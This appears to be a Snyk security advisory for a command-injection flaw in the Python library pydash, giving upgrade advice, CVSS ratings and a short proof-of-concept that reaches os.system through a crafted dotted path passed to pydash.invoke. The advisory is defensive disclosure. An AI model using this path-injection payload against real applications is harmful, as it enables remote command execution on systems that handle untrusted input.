Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.

## How to fix?

Upgrade `pydash` to version 6.0.0 or higher.

## Overview

[pydash](https://pypi.org/project/pydash) is a The kitchen sink of Python utility libraries for doing "stuff" in a functional way. Based on the Lo-Dash Javascript library.

Affected versions of this package are vulnerable to Command Injection. A number of pydash methods such as `pydash.objects.invoke()` and `pydash.collections.invoke_map()` accept dotted paths (Deep Path Strings) to target a nested Python object, relative to the original source object. These paths can be used to target internal class attributes and dict items, to retrieve, modify or invoke nested Python objects.

**Note:**

The `pydash.objects.invoke()` method is vulnerable to Command Injection when the following prerequisites are satisfied:

1. The source object (argument 1) is not a built-in object such as list/dict (otherwise, the `__init__.__globals__` path is not accessible)
2. The attacker has control over argument 2 (the path string) and argument 3 (the argument to pass to the invoked method)

The `pydash.collections.invoke_map()` method is also vulnerable, but is harder to exploit as the attacker does not have direct control over the argument to be passed to the invoked function.

## PoC

```
import sys
import random

import pydash

class Animal:
    def __init__(self, typ, age):
        self.type = typ
        self.age = age
        self.id = random.randint(1, 99999)

def poc(path, arg):
    """
        Use a malicious path to execute code via the __init__.__globals__ dict (not available with dict/list input objects?)
        I.e: pydash.invoke(obj, '__init__.__globals__.random._os.system', 'id')
    """

    obj = Animal('cat', 11)
    res = pydash.invoke(obj, path, arg)
    print(res)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Missing args: %s <path> <arg>' % sys.argv[0])
        sys.exit(1)
    poc(sys.argv[1], sys.argv[2])

```

### CVSS Scores

version 3.1
### Snyk

7.4 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  A successful attack depends on conditions beyond the attacker's control. That is, a successful attack cannot be accomplished at will, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.

  **High**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**
